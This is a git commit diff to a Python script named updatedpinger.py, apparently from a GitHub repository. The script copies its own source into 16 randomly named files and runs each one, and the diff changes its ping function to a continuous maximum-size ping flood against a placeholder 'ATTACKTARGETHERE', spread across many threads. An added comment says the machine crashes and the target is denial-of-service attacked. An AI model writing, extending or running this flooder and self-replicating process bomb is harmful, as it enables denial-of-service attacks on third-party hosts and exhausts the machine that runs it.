9454b5f3dd7cdcad89c583202da03f6f03e27827
Stoned Paul <45460445+StonedPaul@users.noreply.github.com>
2021-06-16 06:25:11 -0600

    Update updatedpinger.py

--- updatedpinger.py
+++ updatedpinger.py
@@ -5,8 +5,7 @@ import os
 def mkname(s):
     return ''.join(r.choice(s) for i in range(100))+'.py'
 def pinger():
-    while True:
-        os.system('ping www.google.com')
+    os.system('ping ATTACKTARGETHERE -t -l 65500')
 s = 'QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890'
 names = [mkname(s) for i in range(16)]
 with open(sys.argv[0], 'r') as f:
@@ -18,7 +17,7 @@ for i,name in enumerate(names):
     new_file.close()
     os.system(f'python3 {name}')
     for i in range(10):
-        thread = threading.Thread(name=f"thread[{i}]",target=pinger())
+        thread = threading.Thread(name=f"thread[{i}]",target=pinger)
         thread.start()
-        thread.join()
 f.close()
+#computer shits the bed and the attacktarget gets DOS attacked sort of
